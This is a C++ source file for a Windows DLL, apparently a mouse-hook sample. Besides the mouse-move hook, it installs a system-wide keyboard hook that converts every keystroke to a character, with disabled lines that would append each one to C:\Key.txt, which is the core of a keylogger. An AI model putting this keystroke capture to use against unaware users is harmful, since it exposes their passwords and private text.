// MouseHook.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#define _COMPILING_44E531B1_14D3_11d5_A025_006067718D04
#include "MouseHook.h"
#include <fstream>

#pragma data_seg(".JOE")
HWND hWndServer = NULL;
#pragma data_seg()
#pragma comment(linker, "/section:.JOE,rws")


#pragma data_seg(".SHARDAT")
HHOOK hKeyboard=NULL;
#pragma data_seg()

HINSTANCE hInst;
UINT UWM_MOUSEMOVE;
HHOOK hMouseHook;

static LRESULT CALLBACK MsgProc(UINT nCode, WPARAM wParam, LPARAM lParam);
static LRESULT CALLBACK KeyboardProc( int nCode, WPARAM wParam, LPARAM lParam);


BOOL APIENTRY DllMain( HINSTANCE hInstance, 
                       DWORD  Reason, 
                       LPVOID Reserved
					 )
{
 switch(Reason)
    { /* reason */
     case DLL_PROCESS_ATTACH:
		hInst = hInstance;
		UWM_MOUSEMOVE = RegisterWindowMessage(UWM_MOUSEMOVE_MSG);
		return TRUE;
     case DLL_PROCESS_DETACH:
		if(hWndServer != NULL)
			clearMyHook(hWndServer);
		return TRUE;
    } /* reason */
    return TRUE;
}

/****************************************************************************
*                                 setMyHook
* Inputs:
*       HWND hWnd: Window to notify
* Result: BOOL
*       TRUE if successful
*	FALSE if error
* Effect: 
*       Sets the hook
****************************************************************************/

__declspec(dllexport) BOOL setMyHook(HWND hWnd)
{
    if(hWndServer != NULL)
		return FALSE; // already hooked!
    hMouseHook = SetWindowsHookEx(WH_GETMESSAGE,
			    (HOOKPROC)MsgProc,
			    hInst,
			    0);
	hKeyboard  = SetWindowsHookEx(WH_KEYBOARD,
				(HOOKPROC)KeyboardProc,
				hInst,
				0);

    if(hMouseHook != NULL)
	{ /* success */
		 hWndServer = hWnd;
		 return TRUE;
	} /* success */
    return FALSE; // failed to set hook
} // setMyHook

/****************************************************************************
*                                 clearMyHook
* Inputs:
*       HWND hWnd: Window hook
* Result: BOOL
*       TRUE if successful
*	FALSE if error
* Effect: 
*       Removes the hook that has been set
****************************************************************************/

__declspec(dllexport) BOOL clearMyHook(HWND hWnd)
{
    if(hWnd != hWndServer || hWnd == NULL)
		return FALSE;
    BOOL unhooked = UnhookWindowsHookEx(hMouseHook) && UnhookWindowsHookEx(hKeyboard);
    if(unhooked)
		hWndServer = NULL;
    return unhooked;
} // clearMyHook

/****************************************************************************
*                                   msghook
* Inputs:
*       int nCode: Code value
*	WPARAM wParam:
*	LPARAM lParam:
* Result: LRESULT
*       Either 0 or the result of CallNextHookEx
* Effect: 
*       Hook processing function. If the message is a mouse-move message,
*	posts the coordinates to the parent window
****************************************************************************/

static LRESULT CALLBACK MsgProc(UINT nCode, WPARAM wParam, LPARAM lParam)
{
    if(nCode < 0)
	{ /* pass it on */
		CallNextHookEx(hMouseHook, nCode, wParam, lParam);
		return 0;
	} /* pass it on */
    LPMSG msg = (LPMSG)lParam;
    if(msg->message == WM_MOUSEMOVE ||
		msg->message == WM_NCMOUSEMOVE)
	{
		PostMessage(hWndServer, UWM_MOUSEMOVE, 0, 0);
	}
	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);

} // msghook

static LRESULT CALLBACK KeyboardProc( int nCode, WPARAM wParam,   LPARAM lParam)
{
	char ch;			
	if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
	{		
		if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100)) 
		{
			if (wParam==VK_RETURN)
			{	
				ch='\n';
			}
			else
			{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch =char(w); 
			}

// 			std::ofstream fout("C:\\Key.txt",std::ios::app);
// 			fout<<ch<<','<<std::endl;
// 			fout.close();
		}
	}
	return   CallNextHookEx( hKeyboard, nCode, wParam, lParam );
}